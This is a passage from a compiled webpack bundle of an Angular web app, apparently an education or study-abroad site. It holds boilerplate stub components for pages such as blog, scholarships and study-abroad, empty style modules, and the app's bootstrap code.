    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var AboutTheTestComponent = /** @class */ (function () {
    function AboutTheTestComponent() {
    }
    AboutTheTestComponent.prototype.ngOnInit = function () {
    };
    AboutTheTestComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-about-the-test',
            template: __webpack_require__(/*! ./about-the-test.component.html */ "./src/app/views/about-the-test/about-the-test.component.html"),
            styles: [__webpack_require__(/*! ./about-the-test.component.scss */ "./src/app/views/about-the-test/about-the-test.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], AboutTheTestComponent);
    return AboutTheTestComponent;
}());



/***/ }),

/***/ "./src/app/views/about-us/about-us.component.html":
/*!********************************************************!*\
  !*** ./src/app/views/about-us/about-us.component.html ***!
  \********************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<p>\n  about-us works!\n</p>\n"

/***/ }),

/***/ "./src/app/views/about-us/about-us.component.scss":
/*!********************************************************!*\
  !*** ./src/app/views/about-us/about-us.component.scss ***!
  \********************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL3ZpZXdzL2Fib3V0LXVzL2Fib3V0LXVzLmNvbXBvbmVudC5zY3NzIn0= */"

/***/ }),

/***/ "./src/app/views/about-us/about-us.component.ts":
/*!******************************************************!*\
  !*** ./src/app/views/about-us/about-us.component.ts ***!
  \******************************************************/
/*! exports provided: AboutUsComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AboutUsComponent", function() { return AboutUsComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var AboutUsComponent = /** @class */ (function () {
    function AboutUsComponent() {
    }
    AboutUsComponent.prototype.ngOnInit = function () {
    };
    AboutUsComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-about-us',
            template: __webpack_require__(/*! ./about-us.component.html */ "./src/app/views/about-us/about-us.component.html"),
            styles: [__webpack_require__(/*! ./about-us.component.scss */ "./src/app/views/about-us/about-us.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], AboutUsComponent);
    return AboutUsComponent;
}());



/***/ }),

/***/ "./src/app/views/blog/blog.component.html":
/*!************************************************!*\
  !*** ./src/app/views/blog/blog.component.html ***!
  \************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<p>\n  blog works!\n</p>\n"

/***/ }),

/***/ "./src/app/views/blog/blog.component.scss":
/*!************************************************!*\
  !*** ./src/app/views/blog/blog.component.scss ***!
  \************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL3ZpZXdzL2Jsb2cvYmxvZy5jb21wb25lbnQuc2NzcyJ9 */"

/***/ }),

/***/ "./src/app/views/blog/blog.component.ts":
/*!**********************************************!*\
  !*** ./src/app/views/blog/blog.component.ts ***!
  \**********************************************/
/*! exports provided: BlogComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "BlogComponent", function() { return BlogComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var BlogComponent = /** @class */ (function () {
    function BlogComponent() {
    }
    BlogComponent.prototype.ngOnInit = function () {
    };
    BlogComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-blog',
            template: __webpack_require__(/*! ./blog.component.html */ "./src/app/views/blog/blog.component.html"),
            styles: [__webpack_require__(/*! ./blog.component.scss */ "./src/app/views/blog/blog.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], BlogComponent);
    return BlogComponent;
}());



/***/ }),

/***/ "./src/app/views/contact-us/contact-us.component.html":
/*!************************************************************!*\
  !*** ./src/app/views/contact-us/contact-us.component.html ***!
  \************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<p>\n  contact-us works!\n</p>\n"

/***/ }),

/***/ "./src/app/views/contact-us/contact-us.component.scss":
/*!************************************************************!*\
  !*** ./src/app/views/contact-us/contact-us.component.scss ***!
  \************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL3ZpZXdzL2NvbnRhY3QtdXMvY29udGFjdC11cy5jb21wb25lbnQuc2NzcyJ9 */"

/***/ }),

/***/ "./src/app/views/contact-us/contact-us.component.ts":
/*!**********************************************************!*\
  !*** ./src/app/views/contact-us/contact-us.component.ts ***!
  \**********************************************************/
/*! exports provided: ContactUsComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "ContactUsComponent", function() { return ContactUsComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var ContactUsComponent = /** @class */ (function () {
    function ContactUsComponent() {
    }
    ContactUsComponent.prototype.ngOnInit = function () {
    };
    ContactUsComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-contact-us',
            template: __webpack_require__(/*! ./contact-us.component.html */ "./src/app/views/contact-us/contact-us.component.html"),
            styles: [__webpack_require__(/*! ./contact-us.component.scss */ "./src/app/views/contact-us/contact-us.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], ContactUsComponent);
    return ContactUsComponent;
}());



/***/ }),

/***/ "./src/app/views/holiday/holiday.component.html":
/*!******************************************************!*\
  !*** ./src/app/views/holiday/holiday.component.html ***!
  \******************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<p>\n  holiday works!\n</p>\n"

/***/ }),

/***/ "./src/app/views/holiday/holiday.component.scss":
/*!******************************************************!*\
  !*** ./src/app/views/holiday/holiday.component.scss ***!
  \******************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL3ZpZXdzL2hvbGlkYXkvaG9saWRheS5jb21wb25lbnQuc2NzcyJ9 */"

/***/ }),

/***/ "./src/app/views/holiday/holiday.component.ts":
/*!****************************************************!*\
  !*** ./src/app/views/holiday/holiday.component.ts ***!
  \****************************************************/
/*! exports provided: HolidayComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "HolidayComponent", function() { return HolidayComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var HolidayComponent = /** @class */ (function () {
    function HolidayComponent() {
    }
    HolidayComponent.prototype.ngOnInit = function () {
    };
    HolidayComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-holiday',
            template: __webpack_require__(/*! ./holiday.component.html */ "./src/app/views/holiday/holiday.component.html"),
            styles: [__webpack_require__(/*! ./holiday.component.scss */ "./src/app/views/holiday/holiday.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], HolidayComponent);
    return HolidayComponent;
}());



/***/ }),

/***/ "./src/app/views/migration/migration.component.html":
/*!**********************************************************!*\
  !*** ./src/app/views/migration/migration.component.html ***!
  \**********************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<p>\n  migration works!\n</p>\n"

/***/ }),

/***/ "./src/app/views/migration/migration.component.scss":
/*!**********************************************************!*\
  !*** ./src/app/views/migration/migration.component.scss ***!
  \**********************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL3ZpZXdzL21pZ3JhdGlvbi9taWdyYXRpb24uY29tcG9uZW50LnNjc3MifQ== */"

/***/ }),

/***/ "./src/app/views/migration/migration.component.ts":
/*!********************************************************!*\
  !*** ./src/app/views/migration/migration.component.ts ***!
  \********************************************************/
/*! exports provided: MigrationComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "MigrationComponent", function() { return MigrationComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var MigrationComponent = /** @class */ (function () {
    function MigrationComponent() {
    }
    MigrationComponent.prototype.ngOnInit = function () {
    };
    MigrationComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-migration',
            template: __webpack_require__(/*! ./migration.component.html */ "./src/app/views/migration/migration.component.html"),
            styles: [__webpack_require__(/*! ./migration.component.scss */ "./src/app/views/migration/migration.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], MigrationComponent);
    return MigrationComponent;
}());



/***/ }),

/***/ "./src/app/views/news/news.component.html":
/*!************************************************!*\
  !*** ./src/app/views/news/news.component.html ***!
  \************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<app-temp-page></app-temp-page>"

/***/ }),

/***/ "./src/app/views/news/news.component.scss":
/*!************************************************!*\
  !*** ./src/app/views/news/news.component.scss ***!
  \************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL3ZpZXdzL25ld3MvbmV3cy5jb21wb25lbnQuc2NzcyJ9 */"

/***/ }),

/***/ "./src/app/views/news/news.component.ts":
/*!**********************************************!*\
  !*** ./src/app/views/news/news.component.ts ***!
  \**********************************************/
/*! exports provided: NewsComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "NewsComponent", function() { return NewsComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var NewsComponent = /** @class */ (function () {
    function NewsComponent() {
    }
    NewsComponent.prototype.ngOnInit = function () {
    };
    NewsComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-news',
            template: __webpack_require__(/*! ./news.component.html */ "./src/app/views/news/news.component.html"),
            styles: [__webpack_require__(/*! ./news.component.scss */ "./src/app/views/news/news.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], NewsComponent);
    return NewsComponent;
}());



/***/ }),

/***/ "./src/app/views/partnerships/partnerships.component.html":
/*!****************************************************************!*\
  !*** ./src/app/views/partnerships/partnerships.component.html ***!
  \****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<p>\n  partnerships works!\n</p>\n"

/***/ }),

/***/ "./src/app/views/partnerships/partnerships.component.scss":
/*!****************************************************************!*\
  !*** ./src/app/views/partnerships/partnerships.component.scss ***!
  \****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL3ZpZXdzL3BhcnRuZXJzaGlwcy9wYXJ0bmVyc2hpcHMuY29tcG9uZW50LnNjc3MifQ== */"

/***/ }),

/***/ "./src/app/views/partnerships/partnerships.component.ts":
/*!**************************************************************!*\
  !*** ./src/app/views/partnerships/partnerships.component.ts ***!
  \**************************************************************/
/*! exports provided: PartnershipsComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "PartnershipsComponent", function() { return PartnershipsComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var PartnershipsComponent = /** @class */ (function () {
    function PartnershipsComponent() {
    }
    PartnershipsComponent.prototype.ngOnInit = function () {
    };
    PartnershipsComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-partnerships',
            template: __webpack_require__(/*! ./partnerships.component.html */ "./src/app/views/partnerships/partnerships.component.html"),
            styles: [__webpack_require__(/*! ./partnerships.component.scss */ "./src/app/views/partnerships/partnerships.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], PartnershipsComponent);
    return PartnershipsComponent;
}());



/***/ }),

/***/ "./src/app/views/scholarships/scholarships.component.html":
/*!****************************************************************!*\
  !*** ./src/app/views/scholarships/scholarships.component.html ***!
  \****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<p>\n  scholarships works!\n</p>\n"

/***/ }),

/***/ "./src/app/views/scholarships/scholarships.component.scss":
/*!****************************************************************!*\
  !*** ./src/app/views/scholarships/scholarships.component.scss ***!
  \****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL3ZpZXdzL3NjaG9sYXJzaGlwcy9zY2hvbGFyc2hpcHMuY29tcG9uZW50LnNjc3MifQ== */"

/***/ }),

/***/ "./src/app/views/scholarships/scholarships.component.ts":
/*!**************************************************************!*\
  !*** ./src/app/views/scholarships/scholarships.component.ts ***!
  \**************************************************************/
/*! exports provided: ScholarshipsComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "ScholarshipsComponent", function() { return ScholarshipsComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var ScholarshipsComponent = /** @class */ (function () {
    function ScholarshipsComponent() {
    }
    ScholarshipsComponent.prototype.ngOnInit = function () {
    };
    ScholarshipsComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-scholarships',
            template: __webpack_require__(/*! ./scholarships.component.html */ "./src/app/views/scholarships/scholarships.component.html"),
            styles: [__webpack_require__(/*! ./scholarships.component.scss */ "./src/app/views/scholarships/scholarships.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], ScholarshipsComponent);
    return ScholarshipsComponent;
}());



/***/ }),

/***/ "./src/app/views/study-abroad/study-abroad.component.html":
/*!****************************************************************!*\
  !*** ./src/app/views/study-abroad/study-abroad.component.html ***!
  \****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<p>\n  study-abroad works!\n</p>\n"

/***/ }),

/***/ "./src/app/views/study-abroad/study-abroad.component.scss":
/*!****************************************************************!*\
  !*** ./src/app/views/study-abroad/study-abroad.component.scss ***!
  \****************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IiIsImZpbGUiOiJzcmMvYXBwL3ZpZXdzL3N0dWR5LWFicm9hZC9zdHVkeS1hYnJvYWQuY29tcG9uZW50LnNjc3MifQ== */"

/***/ }),

/***/ "./src/app/views/study-abroad/study-abroad.component.ts":
/*!**************************************************************!*\
  !*** ./src/app/views/study-abroad/study-abroad.component.ts ***!
  \**************************************************************/
/*! exports provided: StudyAbroadComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "StudyAbroadComponent", function() { return StudyAbroadComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var StudyAbroadComponent = /** @class */ (function () {
    function StudyAbroadComponent() {
    }
    StudyAbroadComponent.prototype.ngOnInit = function () {
    };
    StudyAbroadComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-study-abroad',
            template: __webpack_require__(/*! ./study-abroad.component.html */ "./src/app/views/study-abroad/study-abroad.component.html"),
            styles: [__webpack_require__(/*! ./study-abroad.component.scss */ "./src/app/views/study-abroad/study-abroad.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], StudyAbroadComponent);
    return StudyAbroadComponent;
}());



/***/ }),

/***/ "./src/environments/environment.ts":
/*!*****************************************!*\
  !*** ./src/environments/environment.ts ***!
  \*****************************************/
/*! exports provided: environment */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "environment", function() { return environment; });
// This file can be replaced during build by using the `fileReplacements` array.
// `ng build --prod` replaces `environment.ts` with `environment.prod.ts`.
// The list of file replacements can be found in `angular.json`.
var environment = {
    production: false
};
/*
 * For easier debugging in development mode, you can import the following file
 * to ignore zone related error stack frames such as `zone.run`, `zoneDelegate.invokeTask`.
 *
 * This import should be commented out in production mode because it will have a negative impact
 * on performance if an error is thrown.
 */
// import 'zone.js/dist/zone-error';  // Included with Angular CLI.


/***/ }),

/***/ "./src/main.ts":
/*!*********************!*\
  !*** ./src/main.ts ***!
  \*********************/
/*! no exports provided */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_platform_browser_dynamic__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/platform-browser-dynamic */ "./node_modules/@angular/platform-browser-dynamic/fesm5/platform-browser-dynamic.js");
/* harmony import */ var _app_app_module__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./app/app.module */ "./src/app/app.module.ts");
/* harmony import */ var _environments_environment__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./environments/environment */ "./src/environments/environment.ts");




if (_environments_environment__WEBPACK_IMPORTED_MODULE_3__["environment"].production) {
    Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["enableProdMode"])();
}
Object(_angular_platform_browser_dynamic__WEBPACK_IMPORTED_MODULE_1__["platformBrowserDynamic"])().bootstrapModule(_app_app_module__WEBPACK_IMPORTED_MODULE_2__["AppModule"])
    .catch(function (err) { return console.error(err); });


/***/ }),

/***/ 0:
/*!***************************!*\
  !*** multi ./src/main.ts ***!
  \***************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

module.exports = __webpack_require__(/*! /Users/vudedibor/Desktop/cubelinks/src/main.ts */"./src/main.ts");


/***/ })

},[[0,"runtime","vendor"]]]);
//# sourceMappingURL=main.js.map